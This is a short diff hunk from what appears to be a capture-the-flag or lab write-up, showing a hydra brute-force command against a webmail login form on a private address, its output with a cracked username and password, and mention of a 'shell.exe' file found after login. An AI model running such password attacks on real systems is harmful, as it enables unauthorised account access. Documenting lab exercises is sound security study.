@@ -40,6 +40,7 @@ hydra -L usernames.txt -P passwords.txt  10.200.77.232 http-post-form '/src/redi
 [VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
 [80][http-post-form] host: 10.200.77.232   login: MurphyF   password: Summer2020
 [STATUS] attack finished for 10.200.77.232 (waiting for children to complete tests)
+
 -----------------------------------------------------------
 
 Logging in with 'DaviesJ' we found a 'shell.exe' file.
